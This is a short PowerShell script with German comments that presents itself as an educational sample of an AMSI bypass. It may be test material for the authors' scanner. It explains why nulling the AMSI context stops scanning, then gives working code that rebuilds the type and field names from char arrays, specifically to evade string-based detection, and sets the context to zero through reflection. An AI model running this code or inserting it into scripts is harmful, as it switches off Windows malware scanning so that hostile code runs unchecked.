# AMSI Bypass: AMSI Context Corruption
# ========================================
# ACHTUNG: Dies ist eine BILDUNGSDATEI. Nicht auf Produktivsystemen ausfuehren!
#
# TECHNIK: Korrumpiert den AMSI-Kontext (amsiContext) sodass nachfolgende
# Scan-Aufrufe mit einem invaliden Handle fehlschlagen.
#
# WARUM ES FUNKTIONIERT:
# PowerShell speichert den AMSI-Kontext als IntPtr. Wenn dieser auf 0/null
# gesetzt wird, schlaegt AmsiScanString/AmsiScanBuffer fehl und PowerShell
# behandelt dies als "scan unavailable" -> erlaubt Ausfuehrung.
#
# ERKENNUNG:
# - "amsiutils" String wird von unserem Scanner erkannt
# - Die obfuskierte Version nutzt Char-Arrays um die Erkennung zu umgehen

# Obfuskierte Context-Corruption
$utils = @(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,
           65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,
           108,115) | ForEach-Object { [char]$_ }
$utilsType = -join $utils

$ctx = @(97,109,115,105,67,111,110,116,101,120,116) | ForEach-Object { [char]$_ }
$ctxField = -join $ctx

$type = [Ref].Assembly.GetType($utilsType)
$field = $type.GetField($ctxField, 'NonPublic,Static')
$field.SetValue($null, [IntPtr]::Zero)

Write-Host "AMSI context nullified - subsequent scans will fail gracefully"
Write-Host "malware virus trojan - these should not trigger AMSI anymore"
